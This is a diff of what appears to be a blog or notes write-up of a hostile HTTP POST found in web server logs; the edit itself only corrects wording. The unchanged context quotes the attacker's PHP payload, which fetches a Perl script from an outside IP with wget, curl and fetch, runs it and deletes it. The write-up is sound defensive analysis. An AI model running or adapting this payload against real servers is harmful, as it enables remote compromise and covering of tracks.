@@ -40,6 +40,6 @@ The POST body was:
 <? system("cd /tmp ; wget -c -q  hxxp://139.199.211.175/data/data/msr;perl msr;rm -rf msr ; curl -O  hxxp://139.199.211.175/data/data/msr;perl msr;rm -rf msr; fetch  hxxp://139.199.211.175/data/data/msr;perl msr;rm -rf msr "); ?>
 ```
 
-If someone had PHP installed or linked in cgi-bin, and a webserver configured to permit it to execute, this would have downloaded and executed a perl script, then erased its tracks.  The requesting URL was 139.219.100.104.  Both that and the download URL are on cloud service providers in China - TencentCloud and Microsoft (Microsoft's operated by "21Vianet").
+If someone had PHP installed or linked in cgi-bin, and a web server configured to permit it to execute, this would have downloaded and executed a Perl script, then erased its tracks.  The requesting URL was 139.219.100.104.  Both that and the download URL are on cloud service providers in China - TencentCloud and Microsoft (Microsoft's operated by "21Vianet").
 
 Again, that download server isn't reachable at this point.
